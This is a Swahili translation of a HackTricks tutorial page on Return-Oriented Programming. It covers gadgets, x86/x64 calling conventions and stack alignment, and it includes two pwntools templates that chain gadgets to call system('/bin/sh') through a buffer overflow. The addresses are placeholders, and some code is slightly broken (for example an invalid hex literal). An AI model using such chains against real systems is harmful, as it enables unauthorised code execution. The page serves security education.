# ROP - Programu ya Kurudi kwa Mwelekeo

<details>

<summary><strong>Jifunze kuhusu kudukua AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako ikitangazwa kwenye HackTricks** au **kupakua HackTricks kwa PDF** Angalia [**MIPANGO YA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**bidhaa rasmi za PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) za kipekee
* **Jiunge na** üí¨ [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Shiriki mbinu zako za kudukua kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.

</details>

## **Taarifa Msingi**

**Programu ya Kurudi kwa Mwelekeo (ROP)** ni mbinu ya kudukua ya juu inayotumika kuzunguka hatua za usalama kama **No-Execute (NX)** au **Data Execution Prevention (DEP)**. Badala ya kuingiza na kutekeleza shellcode, muhusika anatumia vipande vya nambari tayari zilizopo kwenye faili ya binary au maktaba zilizopakiwa, inayoitwa **"gadgets"**. Kila gadget kawaida hukamilika na maagizo ya `ret` na hufanya operesheni ndogo, kama vile kuhamisha data kati ya rejista au kufanya operesheni za hisabati. Kwa kuunganisha vipande hivi vya gadgets pamoja, muhusika anaweza kujenga mzigo wa data kufanya operesheni za kupindukia, kwa ufanisi kupuuza ulinzi wa NX/DEP.

### Jinsi ROP Inavyofanya Kazi

1. **Udukuzi wa Mwelekeo wa Kudhibiti**: Kwanza, muhusika anahitaji kudhibiti mwelekeo wa programu, kwa kawaida kwa kutumia kosa la kujaza kijazo ili kubadilisha anwani iliyohifadhiwa ya kurudi kwenye steki.
2. **Unganishaji wa Gadgets**: Mhusika kisha kwa uangalifu huchagua na kuunganisha gadgets kutekeleza hatua zinazotakiwa. Hii inaweza kuhusisha kuweka hoja za wito wa kazi, kuita kazi (k.m., `system("/bin/sh")`), na kushughulikia usafi wowote unaohitajika au operesheni zaidi.
3. **Utekelezaji wa Mzigo wa Data**: Wakati kazi inayoweza kudhurika inaporudi, badala ya kurudi kwenye eneo halali, inaanza kutekeleza mnyororo wa gadgets.

## Mnyororo wa ROP kwenye Mfano wa x86

### **Mbinu za Kuita x86 (32-bit)**

* **cdecl**: Mpigaji anasafisha steki. Hoja za kazi hupakuliwa kwenye steki kwa mpangilio wa kurudi (kulia-kushoto). **Hoja zinapakuliwa kwenye steki kutoka kulia kwenda kushoto.**
* **stdcall**: Kama cdecl, lakini mpokeaji anahusika na kusafisha steki.

### **Kupata Gadgets**

Kwanza, hebu tuchukulie tumetambua gadgets muhimu ndani ya faili ya binary au maktaba zilizopakiwa. Gadgets tunayovutiwa nayo ni:

* `pop eax; ret`: Gadget hii hupakua thamani ya juu ya steki kwenye rejista ya `EAX` na kisha kurudi, kuruhusu udhibiti wa `EAX`.
* `pop ebx; ret`: Kama hapo juu, lakini kwa ajili ya rejista ya `EBX`, ikiruhusu udhibiti wa `EBX`.
* `mov [ebx], eax; ret`: Inahamisha thamani katika `EAX` kwenye eneo la kumbukumbu linaloelekezwa na `EBX` kisha kurudi.
* Kwa kuongezea, tuna anwani ya kazi ya `system()` inayopatikana.

### **Mnyororo wa ROP**

Kwa kutumia **pwntools**, tunajiandaa steki kwa utekelezaji wa mnyororo wa ROP kama ifuatavyo lengo likiwa kutekeleza `system('/bin/sh')`, angalia jinsi mnyororo unavyoanza na:

1. Maagizo ya `ret` kwa madhumuni ya upangaji (hiari)
2. Anwani ya kazi ya `system` (tukidhani ASLR imelemazwa na libc inayojulikana, habari zaidi katika [**Ret2lib**](ret2lib/))
3. Nafasi ya anwani ya kurudi kutoka kwa `system()`
4. Anwani ya string ya `"/bin/sh"` (parameta kwa kazi ya system)
```python
from pwn import *

# Assuming we have the binary's ELF and its process
binary = context.binary = ELF('your_binary_here')
p = process(binary.path)

# Find the address of the string "/bin/sh" in the binary
bin_sh_addr = next(binary.search(b'/bin/sh\x00'))

# Address of system() function (hypothetical value)
system_addr = 0xdeadcode

# A gadget to control the return address, typically found through analysis
ret_gadget = 0xcafebabe  # This could be any gadget that allows us to control the return address

# Construct the ROP chain
rop_chain = [
ret_gadget,    # This gadget is used to align the stack if necessary, especially to bypass stack alignment issues
system_addr,   # Address of system(). Execution will continue here after the ret gadget
0x41414141,    # Placeholder for system()'s return address. This could be the address of exit() or another safe place.
bin_sh_addr    # Address of "/bin/sh" string goes here, as the argument to system()
]

# Flatten the rop_chain for use
rop_chain = b''.join(p32(addr) for addr in rop_chain)

# Send ROP chain
## offset is the number of bytes required to reach the return address on the stack
payload = fit({offset: rop_chain})
p.sendline(payload)
p.interactive()
```
## Mnyororo wa ROP katika Mfano wa x64

### **Mbinu za Kuita x64 (64-bit)**

* Hutumia **mfumo wa kuita wa System V AMD64 ABI** kwenye mifumo inayofanana na Unix, ambapo **vigezo vya kwanza sita vya nambari au pointa hupitishwa kwenye mirejista `RDI`, `RSI`, `RDX`, `RCX`, `R8`, na `R9`**. Vigezo vingine hupitishwa kwenye steki. Thamani ya kurudi hutiwa kwenye `RAX`.
* Mfumo wa kuita wa **Windows x64** hutumia `RCX`, `RDX`, `R8`, na `R9` kwa vigezo vinne vya kwanza vya nambari au pointa, na vigezo vingine hupitishwa kwenye steki. Thamani ya kurudi hutiwa kwenye `RAX`.
* **Mirejista**: Mirejista ya 64-bit ni pamoja na `RAX`, `RBX`, `RCX`, `RDX`, `RSI`, `RDI`, `RBP`, `RSP`, na `R8` hadi `R15`.

#### **Kupata Vifaa vya Kutekeleza**

Kwa madhumuni yetu, tuzingatie vifaa vitakavyoturuhusu kuweka mirejista ya **RDI** (kuipitisha herufi **"/bin/sh"** kama hoja kwa **system()**) na kisha kuita kazi ya **system()**. Tutadhani tumetambua vifaa vifuatavyo:

* **pop rdi; ret**: Hupokea thamani ya juu ya steki kwenye **RDI** na kisha kurudi. Muhimu kwa kuweka hoja yetu kwa **system()**.
* **ret**: Kurudi kwa kawaida, inayofaa kwa upangaji wa steki katika hali fulani.

Na tunajua anwani ya kazi ya **system()**.

### **Mnyororo wa ROP**

Hapa chini ni mfano ukitumia **pwntools** kuweka na kutekeleza mnyororo wa ROP ukiwa na lengo la kutekeleza **system('/bin/sh')** kwenye **x64**:
```python
pythonCopy codefrom pwn import *

# Assuming we have the binary's ELF and its process
binary = context.binary = ELF('your_binary_here')
p = process(binary.path)

# Find the address of the string "/bin/sh" in the binary
bin_sh_addr = next(binary.search(b'/bin/sh\x00'))

# Address of system() function (hypothetical value)
system_addr = 0xdeadbeefdeadbeef

# Gadgets (hypothetical values)
pop_rdi_gadget = 0xcafebabecafebabe  # pop rdi; ret
ret_gadget = 0xdeadbeefdeadbead     # ret gadget for alignment, if necessary

# Construct the ROP chain
rop_chain = [
ret_gadget,        # Alignment gadget, if needed
pop_rdi_gadget,    # pop rdi; ret
bin_sh_addr,       # Address of "/bin/sh" string goes here, as the argument to system()
system_addr        # Address of system(). Execution will continue here.
]

# Flatten the rop_chain for use
rop_chain = b''.join(p64(addr) for addr in rop_chain)

# Send ROP chain
## offset is the number of bytes required to reach the return address on the stack
payload = fit({offset: rop_chain})
p.sendline(payload)
p.interactive()
```
Katika mfano huu:

* Tunatumia kifaa cha **`pop rdi; ret`** kuweka **`RDI`** kwa anwani ya **`"/bin/sh"`**.
* Tunaruka moja kwa moja kwenda kwa **`system()`** baada ya kuweka **`RDI`**, na anwani ya **system()** katika mnyororo.
* **`ret_gadget`** hutumiwa kwa upangilio ikiwa mazingira ya lengo yanahitaji, ambayo ni ya kawaida zaidi katika **x64** kuhakikisha upangilio sahihi wa stak kabla ya kuita kazi.

### Upangilio wa Stak

**ABI ya x86-64** inahakikisha kuwa **stak ina upangilio wa byte 16** wakati maagizo ya **wito** yanatekelezwa. **LIBC**, kuboresha utendaji, **inatumia maagizo ya SSE** (kama **movaps**) ambayo yanahitaji upangilio huu. Ikiwa stak haiko sawa (maana **RSP** sio maradufu ya 16), wito kwa kazi kama **system** utashindwa katika **mnyororo wa ROP**. Ili kusahihisha hili, tuongeze tu **ret gadget** kabla ya kuita **system** katika mnyororo wako wa ROP.

## Tofauti Kuu kati ya x86 na x64

{% hint style="success" %}
Kwa kuwa x64 inatumia rejista kwa hoja za kwanza chache, mara nyingi inahitaji vifaa vichache kuliko x86 kwa wito rahisi wa kazi, lakini kupata na kuunganisha vifaa sahihi kunaweza kuwa ngumu zaidi kutokana na idadi kubwa ya rejista na nafasi kubwa ya anwani. Idadi kubwa ya rejista na nafasi kubwa ya anwani katika usanidi wa **x64** hutoa fursa na changamoto kwa maendeleo ya kutumia udhaifu, hasa katika muktadha wa Programu ya Kurudi kwa Mwelekeo (ROP).
{% endhint %}

## Kinga

* [**ASLR**](../common-binary-protections-and-bypasses/aslr/)
* [**Stack Canaries**](../common-binary-protections-and-bypasses/stack-canaries/)

## Mifano na Marejeo Mengine

* [https://ir0nstone.gitbook.io/notes/types/stack/return-oriented-programming/exploiting-calling-conventions](https://ir0nstone.gitbook.io/notes/types/stack/return-oriented-programming/exploiting-calling-conventions)

## Mbinu za msingi za ROP

Tambua kuwa ROP ni mbinu tu ya kutekeleza nambari ya kupendelea. Kulingana na ROP, mbinu nyingi za Ret2XXX ziliendelezwa:

* **Ret2lib**: Tumia ROP kuita kazi za kupendelea kutoka kwa maktaba iliyojazwa na vigezo vya kupendelea (kawaida kitu kama `system('/bin/sh')`.

{% content-ref url="ret2lib/" %}
[ret2lib](ret2lib/)
{% endcontent-ref %}

* **Ret2Syscall**: Tumia ROP kuandaa wito kwa syscall, k.m. `execve`, na kufanya iitumie amri za kupendelea.

{% content-ref url="rop-syscall-execv.md" %}
[rop-syscall-execv.md](rop-syscall-execv.md)
{% endcontent-ref %}

* **EBP2Ret & EBP Chaining**: Ya kwanza itatumia EBP badala ya EIP kudhibiti mtiririko na ya pili ni sawa na Ret2lib lakini katika kesi hii mtiririko unadhibitiwa hasa na anwani za EBP (ingawa pia ni muhimu kudhibiti EIP).

{% content-ref url="ebp2ret-ebp-chaining.md" %}
[ebp2ret-ebp-chaining.md](ebp2ret-ebp-chaining.md)
{% endcontent-ref %}
